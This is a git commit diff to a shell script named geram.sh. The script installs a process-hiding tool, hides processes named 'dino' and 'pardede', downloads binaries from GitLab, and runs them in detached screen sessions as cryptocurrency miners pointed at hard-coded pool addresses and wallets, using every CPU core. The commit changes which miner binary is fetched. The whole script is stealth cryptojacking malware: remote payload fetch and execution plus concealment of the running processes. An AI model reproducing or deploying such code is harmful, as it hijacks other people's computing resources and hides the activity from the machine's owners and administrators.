5db33a34f814e0d9013683f90a238860e4bebe36
williehprnuhrxyq <159912408+williehprnuhrxyq@users.noreply.github.com>
2024-06-13 16:20:07 +0700

    Update geram.sh

--- geram.sh
+++ geram.sh
@@ -8,9 +8,9 @@ apt-get install -y nodejs
 sudo apt install npm =y
 sudo npm i -g node-process-hider && sudo ph add dino
 sudo ph add pardede
-wget https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/dino && chmod +x *
+wget https://gitlab.com/williehprnuhrxyq/gudangku/-/raw/main/saurus && chmod +x *
 wget https://gitlab.com/sarifadim/jomblo/-/raw/main/pardede && chmod +x *
-screen -dms run ./dino -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
+screen -dms run ./saurus -a autolykos2 -o 47.236.130.246:443 -u 3JWuijUT2hwsC862trVXBSMzQW6JANF63j.$(echo 00-$(TZ=UTC-7 date +"%H-%M-%S")) -p x
 screen -dms run ./pardede -a rx/0 -o 47.89.195.104:443 -u ZEPHsC5qZJv8JqyaGPNAviDERPxFGBzXx1bo8rx7RqD9JkPh68Lk7AnLdsNAZfrukeFoU9dnboT6tAJkAZ1etvM1Q5PqiQu8DEk.$(echo B-$(TZ=UTC-7 date +"%H-%M-%S")) -p -x -t $(nproc --all)
 EOF
 screen -r
